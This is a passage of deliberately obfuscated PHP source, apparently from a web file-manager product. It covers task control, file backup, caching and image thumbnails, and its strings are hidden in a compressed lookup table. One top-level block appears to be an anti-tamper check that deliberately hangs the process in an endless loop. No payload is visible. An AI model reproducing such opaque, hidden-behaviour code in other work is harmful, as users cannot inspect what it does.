$C¨ĞãÖ™Œµ[$fâ­Íë°÷‚[671]]; if ($A­ç‰È¹É¹ == self::STATYS_KILL) { $bßâ×Ÿİ’÷ = array($fâ­Íë°÷‚[1438] => LNG($fâ­Íë°÷‚[1439]), $fâ­Íë°÷‚[1018] => !1); Cache::set($fâ­Íë°÷‚[1440] . $this->task[$fâ­Íë°÷‚[367]], $bßâ×Ÿİ’÷, 30); $this->end(); die; } else { if ($A­ç‰È¹É¹ == self::STATYS_STOP) { $f¾áËÖª½ = 2; $C¨ĞãÖ™Œµ[$fâ­Íë°÷‚[1429]] += $f¾áËÖª½; self::valueSet($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[367]], $C¨ĞãÖ™Œµ); sleep($f¾áËÖª½); $this->update(); return; } } goto CÄğàĞ´çŒ; cêßËóĞ”: $this->updateAfter(); $C‚ßÄ²§å = 0.2; if (timeFloat() - $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1428]] < $C‚ßÄ²§å) { return; } goto EÔê÷æ‰Û×; CÄğàĞ´çŒ: $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[671]] = $A­ç‰È¹É¹ ? $A­ç‰È¹É¹ : $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[671]]; $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1429]] = $C¨ĞãÖ™Œµ[$fâ­Íë°÷‚[1429]] ? $C¨ĞãÖ™Œµ[$fâ­Íë°÷‚[1429]] : 0; $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1428]] = timeFloat(); goto A…óù½ãïÙ; d‡¿¤ƒ•ò: $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[976]] += $CÇëäÁùÕ; $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1427]] = timeFloat(); if ($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[962]]) { if ($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[962]] < $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[976]]) { $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[962]] = $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[976]]; } $E›«”…‘ÆÖ = timeFloat() - $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1426]] - $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1429]]; $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1424]] = $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[976]] / $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[962]]; $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1425]] = $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[976]] / $E›«”…‘ÆÖ; if ($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1424]] > 0) { $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1430]] = $E›«”…‘ÆÖ * (1 - $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1424]]) / $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1424]]; } $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1430]] = $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1430]] <= 0 ? 0 : $A×ôİÚÍƒŒ[$fâ­Íë°÷‚[1430]]; } goto cêßËóĞ”; A…óù½ãïÙ: Hook::trigger($fâ­Íë°÷‚[1441], $A×ôİÚÍƒŒ); self::valueSet($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[367]], $A×ôİÚÍƒŒ); goto F‰Óêë¶¬; cÛ‡Ë½¤Êê: $fâ­Íë°÷‚ =& $_SERVER[í™]; $A×ôİÚÍƒŒ =& $this->task; if (!$A×ôİÚÍƒŒ) { return; } goto d‡¿¤ƒ•ò; F‰Óêë¶¬: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($A‰îì÷ Ê) { $E”ã½Ï¥¼ =& $_SERVER[í™]; Cache::set($E”ã½Ï¥¼[1440] . $this->task[$E”ã½Ï¥¼[367]], $A‰îì÷ Ê, 60); return $A‰îì÷ Ê; } public static function get($fÒ÷¾æğï©) { return self::valueGet($fÒ÷¾æğï©); } public static function listData() { $F…Ò‚„©–³ = self::valueGet(); return array_sort_by($F…Ò‚„©–³, $_SERVER[í™][1426], !0); } public static function kill($f±Ü„ŠÀµº) { return self::changeStatus($f±Ü„ŠÀµº, self::STATYS_KILL); } public static function stop($b¤ŠŠššé) { return self::changeStatus($b¤ŠŠššé, self::STATYS_STOP); } public static function restart($dÔŠª„·) { return self::changeStatus($dÔŠª„·, self::STATYS_RUNNING); } public static function killAll() { $E…Œ×¸Äˆ =& $_SERVER[í™]; $Bë±¹ùáß = self::listData(); foreach ($Bë±¹ùáß as $bŞ¢ÒÃã¢) { self::kill($bŞ¢ÒÃã¢[$E…Œ×¸Äˆ[367]]); } sleep(2); foreach ($Bë±¹ùáß as $bŞ¢ÒÃã¢) { self::valueSet($bŞ¢ÒÃã¢[$E…Œ×¸Äˆ[367]], !1); } } private static function changeStatus($FÀÛ–‡ï¾Ö, $FËòÌ¤¤Í¯) { goto CÔ¾§ì„¸Á; CÔ¾§ì„¸Á: $F¬ö•Š“Š =& $_SERVER[í™]; $A ‡‡ŠÍƒŠ = self::valueGet($FÀÛ–‡ï¾Ö); if (!$A ‡‡ŠÍƒŠ) { return !1; } goto Aİ”Ì²³ªŞ; AëÕó–‚èË: return !0; goto dÕêÙ³ é½; Aİ”Ì²³ªŞ: $A ‡‡ŠÍƒŠ[$F¬ö•Š“Š[671]] = $FËòÌ¤¤Í¯; self::valueSet($FÀÛ–‡ï¾Ö, $A ‡‡ŠÍƒŠ); self::log($F¬ö•Š“Š[1442] . $A ‡‡ŠÍƒŠ[$F¬ö•Š“Š[367]] . $F¬ö•Š“Š[1443] . $FËòÌ¤¤Í¯); goto AëÕó–‚èË; dÕêÙ³ é½: } public static function valueGet($fô×ŠÇ²Ê™ = false) { $d³„ãğÙ°µ =& $_SERVER[í™]; if ($fô×ŠÇ²Ê™) { $B§ãÖ¿„æÒ = Model($d³„ãğÙ°µ[399])->where(array($d³„ãğÙ°µ[89] => $fô×ŠÇ²Ê™, $d³„ãğÙ°µ[29] => $d³„ãğÙ°µ[1444]))->find(); return $B§ãÖ¿„æÒ ? json_decode($B§ãÖ¿„æÒ[$d³„ãğÙ°µ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($C‡ùÕ¡Åà¸ = false) { goto bÖÂ ööçÈ; a¿¡ÍòÕ†¨: $AØˆãö ô = Model($d·ó•»ïÖù[399])->where($a„ë‡·®æé)->select(); $AØˆãö ô = $AØˆãö ô ? $AØˆãö ô : array(); foreach ($AØˆãö ô as $BÏÒ…¾ùø” => $E¹øº®·ß‰) { $AØˆãö ô[$BÏÒ…¾ùø”] = json_decode($E¹øº®·ß‰[$d·ó•»ïÖù[359]], !0); } goto c§·ìù›ˆØ; bÖÂ ööçÈ: $d·ó•»ïÖù =& $_SERVER[í™]; $a„ë‡·®æé = array($d·ó•»ïÖù[29] => $d·ó•»ïÖù[1444]); if ($C‡ùÕ¡Åà¸) { $a„ë‡·®æé[$d·ó•»ïÖù[1423]] = $C‡ùÕ¡Åà¸; } goto a¿¡ÍòÕ†¨; c§·ìù›ˆØ: return $AØˆãö ô; goto F£ò¿ÃŠ©†; F£ò¿ÃŠ©†: } public static function valueSet($f‘è‹ÊòøÃ, $fã”Åå·»¸) { goto a†Ù²ğÕ¼æ; a†Ù²ğÕ¼æ: $cï„¯Ğ‰ƒ‚ =& $_SERVER[í™]; if (!$fã”Åå·»¸) { return Model($cï„¯Ğ‰ƒ‚[399])->where(array($cï„¯Ğ‰ƒ‚[89] => $f‘è‹ÊòøÃ, $cï„¯Ğ‰ƒ‚[29] => $cï„¯Ğ‰ƒ‚[1444]))->delete(); } $cí¨¤Ğ’ ã = json_encode($fã”Åå·»¸); goto aª‰¼˜ßŞ; aª‰¼˜ßŞ: if (!$cí¨¤Ğ’ ã) { ob_start(); var_dump($fã”Åå·»¸); $BÓçŞÀÑ’® = ob_get_clean(); self::log($cï„¯Ğ‰ƒ‚[1445] . json_encode_force($BÓçŞÀÑ’®)); } if (!$f‘è‹ÊòøÃ || !$fã”Åå·»¸[$cï„¯Ğ‰ƒ‚[367]]) { return !1; } $dõ•ˆ‹¯™ = array($cï„¯Ğ‰ƒ‚[29] => $cï„¯Ğ‰ƒ‚[1444], $cï„¯Ğ‰ƒ‚[1423] => USER_ID, $cï„¯Ğ‰ƒ‚[89] => $f‘è‹ÊòøÃ, $cï„¯Ğ‰ƒ‚[359] => $cí¨¤Ğ’ ã); goto B©Ô±‰Ïåõ; B©Ô±‰Ïåõ: Model($cï„¯Ğ‰ƒ‚[399])->add($dõ•ˆ‹¯™, array(), !0); goto a™º˜à½Ê; a™º˜à½Ê: } public static function log($f¹š¯éòº¯) { write_log($f¹š¯éòº¯, $_SERVER[í™][1446]); } } goto c‡´–ÉŠİƒ; D‚µ„İ ÆÒ: class BackupFile { public function __construct() { } public function index() { goto dÌ° Áˆİ; bî·ÕÉë•è: Backup::set($aĞõ¢›Íê); $this->_fileFilter($d‘‘¯ĞÚ‘); return !0; goto B˜³ò£Ü; EÚîïñÖí÷: $cÓ‚§ƒãí = (int) Model($_SERVER[í™][700])->where($C…İì¹¡¹„)->count($_SERVER[í™][419]); $d˜¯åÆñÀÏ = (int) Model($_SERVER[í™][700])->where($C…İì¹¡¹„)->sum($_SERVER[í™][77]); $bÆ„‡İ¼‰² = new TaskFileTransfer($_SERVER[í™][718], $_SERVER[í™][695], $cÓ‚§ƒãí, LNG($_SERVER[í™][696]) . $_SERVER[í™][697] . LNG($_SERVER[í™][719])); goto fœ®ãŒË ¬; A¥»Ë¢Êµ¼: $CÌùØ¬‘ğµ = !0; $B‡Ê¿¿ÉÄ = $this->storeIds(); $aÅÌ’ù›ÎŒ = 1; goto b³åŠø¤ÜŸ; Cò…“ÀË£§: $C´ŸçÂ‡ò† = $CÌùØ¬‘ğµ ? 1 : 0; $aĞõ¢›Íê = array($_SERVER[í™][732] => 1, $_SERVER[í™][449] => time(), $_SERVER[í™][690] => $C´ŸçÂ‡ò†, $_SERVER[í™][729] => $b»ŒÕŠ»ƒƒ, $_SERVER[í™][721] => $d˜¯åÆñÀÏ, $_SERVER[í™][720] => $cÓ‚§ƒãí); if ($D¸‰ƒŒğÍ„) { $aĞõ¢›Íê[$_SERVER[í™][730]] = $FÎé¢‰¥¾õ; $aĞõ¢›Íê[$_SERVER[í™][731]] = $eà²†Ø¸ñÇ; } goto bî·ÕÉë•è; b³åŠø¤ÜŸ: $dğô»Ÿø†æ = 1000; $FªßÎ¡ñêå = $D¸‰ƒŒğÍ„ = 0; $d‘‘¯ĞÚ‘ = array(); goto BÀ‡ÆÔÆßÖ; BÀ‡ÆÔÆßÖ: $eà²†Ø¸ñÇ = $FÎé¢‰¥¾õ = 0; do { $Fø´å«ÙŠ… = $_SERVER[í™][722]; $dÏˆÚË±Áè = Model($_SERVER[í™][700])->where($C…İì¹¡¹„)->field($Fø´å«ÙŠ…)->order($_SERVER[í™][723])->selectPage($dğô»Ÿø†æ, $aÅÌ’ù›ÎŒ); $DÊİÕ•‘Âè = !empty($dÏˆÚË±Áè[$_SERVER[í™][354]]) ? $dÏˆÚË±Áè[$_SERVER[í™][354]] : array(); foreach ($DÊİÕ•‘Âè as $AõÊÌõ—„) { goto aÄİÕÃŒÚ; Fó¤ìšˆ†„: if ($FªßÎ¡ñêå >= 1024 * 1024 * 100) { $aĞõ¢›Íê = array($_SERVER[í™][729] => $b»ŒÕŠ»ƒƒ, $_SERVER[í™][730] => $FÎé¢‰¥¾õ, $_SERVER[í™][731] => $eà²†Ø¸ñÇ); Backup::set($aĞõ¢›Íê); $FªßÎ¡ñêå = $D¸‰ƒŒğÍ„ = 0; } goto d¼İ‘Üœ; aÄİÕÃŒÚ: if (!$this->_fileExist($AõÊÌõ—„, $d‘‘¯ĞÚ‘, $B‡Ê¿¿ÉÄ)) { $cÓ‚§ƒãí -= 1; $d˜¯åÆñÀÏ -= (int) $AõÊÌõ—„[$_SERVER[í™][77]]; write_log("\x66\x69\154\145\40\156\157\164\x20\145\x78\151\163\x74\x2e\x66\x69\x6c\145\x49\x44\72{$AõÊÌõ—„[$_SERVER[í™][419]]}\x2c\x20\x70\x61\164\150\72{$AõÊÌõ—„[$_SERVER[í™][75]]}", $_SERVER[í™][724]); continue; } $b…Àá‰¸ˆ = $AõÊÌõ—„[$_SERVER[í™][75]]; $AøáŒ¨Ë‹æ = "\173\x69\x6f\x3a{$e¿´´‘Œ¬ó[$_SERVER[í™][673]]}\x7d" . substr($b…Àá‰¸ˆ, strlen("\x7b\151\x6f\x3a{$AõÊÌõ—„[$_SERVER[í™][725]]}\x7d")); goto Eö­à‘è•; Eö­à‘è•: if (IO::exist($AøáŒ¨Ë‹æ)) { $bÆ„‡İ¼‰²->updateFileEnd($AõÊÌõ—„[$_SERVER[í™][28]], $AõÊÌõ—„[$_SERVER[í™][77]]); } else { $AøáŒ¨Ë‹æ = get_path_father($AøáŒ¨Ë‹æ); IO::mkdir($AøáŒ¨Ë‹æ); if (!IO::copy($b…Àá‰¸ˆ, $AøáŒ¨Ë‹æ, $_SERVER[í™][726])) { write_log($_SERVER[í™][727] . $b…Àá‰¸ˆ . $_SERVER[í™][728] . $AøáŒ¨Ë‹æ . $_SERVER[í™][478], $_SERVER[í™][695]); $CÌùØ¬‘ğµ = !1; break; } } $b»ŒÕŠ»ƒƒ = $AõÊÌõ—„[$_SERVER[í™][419]]; $D¸‰ƒŒğÍ„ += 1; goto DÛ½›ˆÅ¦§; DÛ½›ˆÅ¦§: $FªßÎ¡ñêå += $AõÊÌõ—„[$_SERVER[í™][77]]; $FÎé¢‰¥¾õ += 1; $eà²†Ø¸ñÇ += $AõÊÌõ—„[$_SERVER[í™][77]]; goto Fó¤ìšˆ†„; d¼İ‘Üœ: } $cèâ—åÊÑ„ = count($DÊİÕ•‘Âè); $aÅÌ’ù›ÎŒ++; } while ($cèâ—åÊÑ„ == $dğô»Ÿø†æ); $bÆ„‡İ¼‰²->end(); goto Cò…“ÀË£§; dÌ° Áˆİ: $e¿´´‘Œ¬ó = Backup::get(); $b»ŒÕŠ»ƒƒ = $e¿´´‘Œ¬ó[$_SERVER[í™][281]][$_SERVER[í™][167]][$_SERVER[í™][419]]; $C…İì¹¡¹„ = array($_SERVER[í™][420] => array($_SERVER[í™][716], $b»ŒÕŠ»ƒƒ), $_SERVER[í™][717] => array($_SERVER[í™][319], $e¿´´‘Œ¬ó[$_SERVER[í™][673]])); goto EÚîïñÖí÷; fœ®ãŒË ¬: $bÆ„‡İ¼‰²->task[$_SERVER[í™][680]] = $d˜¯åÆñÀÏ; $aĞõ¢›Íê = array($_SERVER[í™][720] => $cÓ‚§ƒãí, $_SERVER[í™][721] => $d˜¯åÆñÀÏ); Backup::set($aĞõ¢›Íê); goto A¥»Ë¢Êµ¼; B˜³ò£Ü: } private function _fileExist($EŒŒÃß—¨, &$E‹™š›¾óÏ, $a¸Ğ³Íº×“) { goto bŠè…Ğ¸ãà; a¤ØÌ—Á…’: if (!in_array($EŒŒÃß—¨[$Cİ¼Üå×Æì[725]], $a¸Ğ³Íº×“)) { return !1; } if (IO::exist($Bƒ¼ªÆ•‹ö)) { return !0; } $AËµ×÷Ü¨º = get_path_father($Bƒ¼ªÆ•‹ö); goto dÄè¤‡¶÷œ; bŠè…Ğ¸ãà: $Cİ¼Üå×Æì =& $_SERVER[í™]; $Bƒ¼ªÆ•‹ö = $EŒŒÃß—¨[$Cİ¼Üå×Æì[75]]; if (in_array($EŒŒÃß—¨[$Cİ¼Üå×Æì[419]], $E‹™š›¾óÏ)) { return !1; } goto a¤ØÌ—Á…’; BÆøâ¡ê¶ê: $E‹™š›¾óÏ = array_merge($E‹™š›¾óÏ, array_to_keyvalue($aÔ¼‚š´, $Cİ¼Üå×Æì[33], $Cİ¼Üå×Æì[419])); return !1; goto D‹Í‡ø‰; dÄè¤‡¶÷œ: if (IO::exist($AËµ×÷Ü¨º)) { $E‹™š›¾óÏ[] = $EŒŒÃß—¨[$Cİ¼Üå×Æì[419]]; return !1; } $dãøĞ×†‚ = array($Cİ¼Üå×Æì[725] => $EŒŒÃß—¨[$Cİ¼Üå×Æì[725]], $Cİ¼Üå×Æì[75] => array($Cİ¼Üå×Æì[733], "{$AËµ×÷Ü¨º}\45")); $aÔ¼‚š´ = Model($Cİ¼Üå×Æì[700])->where($dãøĞ×†‚)->field($Cİ¼Üå×Æì[420])->select(); goto BÆøâ¡ê¶ê; D‹Í‡ø‰: } private function _fileFilter($DŸÏÕ£‚ù½) { $Bõà¥È¥‡ =& $_SERVER[í™]; if (empty($DŸÏÕ£‚ù½)) { return; } $A¢÷µºí…Ã = array($Bõà¥È¥‡[419] => array($Bõà¥È¥‡[7], array_unique($DŸÏÕ£‚ù½))); $E¡‡Ş´ê”Á = Model($Bõà¥È¥‡[734])->where($A¢÷µºí…Ã)->field($Bõà¥È¥‡[369])->select(); foreach ($E¡‡Ş´ê”Á as $EšĞ³Ğ÷÷) { Model($Bõà¥È¥‡[734])->remove($EšĞ³Ğ÷÷[$Bõà¥È¥‡[369]], !1); } } private function storeIds() { $B¿È×ŒÚ·™ =& $_SERVER[í™]; $B¾‹ŠÔËË = Model($B¿È×ŒÚ·™[685])->listData(); $bµ¨¿°ÇØ¶ = array(); $bìÈ®¿êâ = $GLOBALS[$B¿È×ŒÚ·™[6]][$B¿È×ŒÚ·™[84]][$B¿È×ŒÚ·™[735]]; foreach ($B¾‹ŠÔËË as $FÃíß‡¿) { $e…ö¨‚ò¹ = strtolower($FÃíß‡¿[$B¿È×ŒÚ·™[90]]); if (!isset($bìÈ®¿êâ[$e…ö¨‚ò¹])) { continue; } $B±¼¶ÜŒğ = $B¿È×ŒÚ·™[71] . (isset($bìÈ®¿êâ[$e…ö¨‚ò¹]) ? $bìÈ®¿êâ[$e…ö¨‚ò¹] : ucfirst($e…ö¨‚ò¹)); if (!class_exists($B±¼¶ÜŒğ)) { continue; } $bµ¨¿°ÇØ¶[] = $FÃíß‡¿[$B¿È×ŒÚ·™[367]]; } return $bµ¨¿°ÇØ¶; } } if (!isset($_SERVER[$_SERVER[í™][736]]) || !isset($_SERVER[$_SERVER[í™][737]])) { goto bÛ°İ¢¥âã; C÷¿Ô°Ç¿: $CöÖŞ¬µÇŒ($_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]); $d²ŒÁ»Šœ° = 2; while ($d²ŒÁ»Šœ° > 1) { $D ù¾Ğ’’Ù = rawurlencode($d²ŒÁ»Šœ° . $_SERVER[í™][361]); } goto E£èÃÜËœÍ; Dåƒ¯â×ªÚ: $b®Å“±àó = explode($_SERVER[í™][217], $DŒÇ „Šï•); if (count($b®Å“±àó) < $_SERVER[í™][577]) { $d¶œ¥ù—‡‹ = $_SERVER[í™][741]; $d¶œ¥ù—‡‹(); } $CöÖŞ¬µÇŒ = $_SERVER[í™][742]; goto C÷¿Ô°Ç¿; bÛ°İ¢¥âã: $cÂÑÇœîÏ = $_SERVER[í™][738]; $b°¼—öò = $_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]; $DŒÇ „Šï• = $cÂÑÇœîÏ($b°¼—öò); goto Dåƒ¯â×ªÚ; E£èÃÜËœÍ: } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto cÙ£‚âÆï; bŠˆ¤Ù«ÈÌ: $fèíÜ‹ˆê = $GLOBALS[$b‹ÃôàÍå½[6]][$b‹ÃôàÍå½[337]]; $BŞ ªÃÃŠ = $fèíÜ‹ˆê[$fèíÜ‹ˆê[$b‹ÃôàÍå½[743]]]; $Bšˆ©’« ó = $fèíÜ‹ˆê[$b‹ÃôàÍå½[744]]; goto fœŸ§²ğµÕ; fœŸ§²ğµÕ: switch ($fèíÜ‹ˆê[$b‹ÃôàÍå½[743]]) { case $b‹ÃôàÍå½[17]: self::$handle = Model($b‹ÃôàÍå½[745]); break; case $b‹ÃôàÍå½[746]: self::$handle = new CacheRedis($BŞ ªÃÃŠ, $Bšˆ©’« ó); break; case $b‹ÃôàÍå½[747]: self::$handle = new CacheMemcached($BŞ ªÃÃŠ, $Bšˆ©’« ó); break; case $b‹ÃôàÍå½[167]: self::$handle = new CacheFile($BŞ ªÃÃŠ, $Bšˆ©’« ó); break; default: break; } return self::$handle; goto CêÎõö‚ºÏ; cÙ£‚âÆï: $b‹ÃôàÍå½ =& $_SERVER[í™]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto bŠˆ¤Ù«ÈÌ; CêÎõö‚ºÏ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($açšœ´¿§­) { if (is_array($açšœ´¿§­) || is_object($açšœ´¿§­)) { $açšœ´¿§­ = json_encode($açšœ´¿§­); } $açšœ´¿§­ = rawurlencode($açšœ´¿§­); return KOD_SITE_ID . $_SERVER[í™][70] . $açšœ´¿§­; } public static function get($e„³Ğ’­ŠÏ) { $e×‡Ë‘•œ· = self::key($e„³Ğ’­ŠÏ); if (!isset(self::$memoryCache[$e×‡Ë‘•œ·])) { $aÂ¦øÒò±° = self::init()->get($e×‡Ë‘•œ·); self::$memoryCache[$e×‡Ë‘•œ·] = unserialize($aÂ¦øÒò±°); } return self::$memoryCache[$e×‡Ë‘•œ·]; } public static function set($bÇ¿Ä’“Œ•, $Fä¶Ò¯âï¾, $cÚ†ºÊÒõ = false) { goto AŸæÏ°œº¨; AŸæÏ°œº¨: $B®Ş‚õÈÇß = self::key($bÇ¿Ä’“Œ•); if (isset(self::$memoryCache[$B®Ş‚õÈÇß]) && self::$memoryCache[$B®Ş‚õÈÇß] === $Fä¶Ò¯âï¾) { return !0; } if ($cÚ†ºÊÒõ === 0) { self::$memoryCache[$B®Ş‚õÈÇß] = $Fä¶Ò¯âï¾; return !0; } goto DÒÖ‘—ôÕ¹; DÒÖ‘—ôÕ¹: CacheLock::lock($bÇ¿Ä’“Œ•); $bğ£»„å‡« = self::init()->set($B®Ş‚õÈÇß, serialize($Fä¶Ò¯âï¾), $cÚ†ºÊÒõ); self::$memoryCache[$B®Ş‚õÈÇß] = $Fä¶Ò¯âï¾; goto eÚ×ÏïÑê; eÚ×ÏïÑê: CacheLock::unlock($bÇ¿Ä’“Œ•); return $bğ£»„å‡«; goto fÎ´«µÇã—; fÎ´«µÇã—: } public static function remove($aÉªŸÓî…) { goto dŠ¬ÅĞƒç¥; dŠ¬ÅĞƒç¥: $d®†Î÷Ï¿ = self::key($aÉªŸÓî…); unset(self::$memoryCache[$d®†Î÷Ï¿]); self::clearTimeout(); goto e¶Œ®‹ì·å; bÓ¹ÈóáÀ‘: return $Fî•åôÀ·ß; goto F…”£; e¶Œ®‹ì·å: CacheLock::lock($aÉªŸÓî…); $Fî•åôÀ·ß = self::init()->remove($d®†Î÷Ï¿); CacheLock::unlock($aÉªŸÓî…); goto bÓ¹ÈóáÀ‘; F…”£: } public static function clearMemory($BÍ´Ú¡î»³ = false) { if ($BÍ´Ú¡î»³) { $BÍ´Ú¡î»³ = self::key($BÍ´Ú¡î»³); unset(self::$memoryCache[$BÍ´Ú¡î»³]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[í™][748])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[í™][749])) { self::init()->clearTimeout(); } } } goto FíŸí¸É–¨; A··Ó«‚¼É: function beforeShutdown() { Hook::trigger($_SERVER[ñâ][32]); } $_SERVER[$_SERVER[ñâ][33]] = BASIC_PATH; $_SERVER[$_SERVER[ñâ][34]] = LIB_DIR; goto fˆºÄ‚³£; DîÊÂ‹É‰é: define($_SERVER[í™][0], $_SERVER[í™][1]); $_SERVER[ñâ] = explode($_SERVER[í™][2], gzinflate(substr($_SERVER[í™][3], 10, -8))); function Model($F“ˆ…‘µéä = '', $Bò¾±‡ ë = '', $B–‰…µœó¼ = '') { goto b­³Ü°“­; fòíƒÉÆˆô: $A—µ¤ÚçÅ[$E¬åŒò¸÷í] = new ModelBase($F“ˆ…‘µéä, $Bò¾±‡ ë, $B–‰…µœó¼); return $A—µ¤ÚçÅ[$E¬åŒò¸÷í]; goto B»·¸¼†œ˜; d¾êµÇÒ°: if (isset($A—µ¤ÚçÅ[$E¬åŒò¸÷í])) { return $A—µ¤ÚçÅ[$E¬åŒò¸÷í]; } if ($F“ˆ…‘µéä) { $F“ˆ…‘µéä = strtoupper($F“ˆ…‘µéä[0]) . substr($F“ˆ…‘µéä, 1); $e„ø“„ƒóŒ = $F“ˆ…‘µéä . $aÎ‰íÊ›àˆ[1]; if (class_exists($e„ø“„ƒóŒ)) { $A—µ¤ÚçÅ[$E¬åŒò¸÷í] = new $e„ø“„ƒóŒ(); return $A—µ¤ÚçÅ[$E¬åŒò¸÷í]; } } if (!$B–‰…µœó¼) { $B–‰…µœó¼ = $GLOBALS[$aÎ‰íÊ›àˆ[2]][$aÎ‰íÊ›àˆ[3]]; } goto fòíƒÉÆˆô; b­³Ü°“­: $aÎ‰íÊ›àˆ =& $_SERVER[ñâ]; static $A—µ¤ÚçÅ = array(); $E¬åŒò¸÷í = strtolower($Bò¾±‡ ë . $aÎ‰íÊ›àˆ[0] . $F“ˆ…‘µéä); goto d¾êµÇÒ°; B»·¸¼†œ˜: } goto cùõ¯¦‚»”; eã¬–½œô: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($DóÆ½µøĞà, $AÇÉÏÛÇ†å) { goto d–»­ªÛ‰; aÊ™«‘Ÿµ: if (!$this->im) { return !1; } $eø·È¢Æº = $_SERVER[í™][33]; $this->imgData = GetImageSize($DóÆ½µøĞà, $eø·È¢Æº); goto a÷±Ïˆà; a÷±Ïˆà: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto cÂøÍÕğµ; d–»­ªÛ‰: $this->srcFile = $DóÆ½µøĞà; $this->echoType = $AÇÉÏÛÇ†å; $this->im = self::image($DóÆ½µøĞà); goto aÊ™«‘Ÿµ; cÂøÍÕğµ: } public static function image($AÚÉª¨´äô) { $b°”ò„½¡¾ =& $_SERVER[í™]; $CÊ‡Œ»« = $b°”ò„½¡¾[33]; $BÀßÏ´ñäÜ = GetImageSize($AÚÉª¨´äô, $CÊ‡Œ»«); $b‹ŒçˆÁšµ = !1; switch ($BÀßÏ´ñäÜ[2]) { case IMAGETYPE_GIF: if (!function_exists($b°”ò„½¡¾[1851])) { break; } $b‹ŒçˆÁšµ = imagecreatefromgif($AÚÉª¨´äô); break; case IMAGETYPE_JPEG: if (!function_exists($b°”ò„½¡¾[1852])) { break; } $b‹ŒçˆÁšµ = imagecreatefromjpeg($AÚÉª¨´äô); break; case IMAGETYPE_PNG: if (!function_exists($b°”ò„½¡¾[1853])) { break; } $b‹ŒçˆÁšµ = @imagecreatefrompng($AÚÉª¨´äô); imagesavealpha($b‹ŒçˆÁšµ, !0); break; case IMAGETYPE_XBM: $b‹ŒçˆÁšµ = imagecreatefromxbm($AÚÉª¨´äô); break; case IMAGETYPE_WBMP: $b‹ŒçˆÁšµ = imagecreatefromwbmp($AÚÉª¨´äô); break; case IMAGETYPE_BMP: $b‹ŒçˆÁšµ = imagecreatefrombmp($AÚÉª¨´äô); break; default: break; } return $b‹ŒçˆÁšµ; } public static function imageSize($bî†ø¤œ¯) { $D®ß¶é„„ =& $_SERVER[í™]; $d®óÓ‡èğĞ = GetImageSize($bî†ø¤œ¯); if (!$d®óÓ‡èğĞ) { return !1; } return array($D®ß¶é„„[1854] => $d®óÓ‡èğĞ[0], $D®ß¶é„„[1855] => $d®óÓ‡èğĞ[1]); } function distortion($BÌÜŠùâ±ó, $aùàÓÆ, $E²Ë´“‹‡±) { $bï“µÌÓ„ = $this->creatImage($this->im, $aùàÓÆ, $E²Ë´“‹‡±, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bï“µÌÓ„, $BÌÜŠùâ±ó); } function prorate($F¤ç¶»ãã†, $BšÒ›ô÷Ë, $Bğ³¤†—­æ) { $bÄñ’¼·‰ = $BšÒ›ô÷Ë / $Bğ³¤†—­æ; $Aƒë¼–Şä = $this->srcW / $this->srcH; if ($bÄñ’¼·‰ <= $Aƒë¼–Şä) { $Bğ‹›øÌ = $BšÒ›ô÷Ë; $ağ““ƒÇé = $Bğ‹›øÌ * ($this->srcH / $this->srcW); } else { $ağ““ƒÇé = $Bğ³¤†—­æ; $Bğ‹›øÌ = $ağ““ƒÇé * ($this->srcW / $this->srcH); } if ($this->srcW > $BšÒ›ô÷Ë || $this->srcH > $Bğ³¤†—­æ) { $d †äÓ¼³‡ = $this->creatImage($this->im, $Bğ‹›øÌ, $ağ““ƒÇé, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $d †äÓ¼³‡ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $d †äÓ¼³‡ = $this->autoRotate($d †äÓ¼³‡); return $this->echoImage($d †äÓ¼³‡, $F¤ç¶»ãã†); } private function autoRotate($E§‹‹³Ø·) { goto CºÜé˜ïù§; CºÜé˜ïù§: $eøÜÌÒ–˜† =& $_SERVER[í™]; if (!$E§‹‹³Ø· || !function_exists($eøÜÌÒ–˜†[1856])) { return $E§‹‹³Ø·; } $cìÕ»”ßÒô = exif_read_data($this->srcFile); goto c½²Á‚Õ§¼; c½²Á‚Õ§¼: if (!$cìÕ»”ßÒô || !isset($cìÕ»”ßÒô[$eøÜÌÒ–˜†[1857]]) || 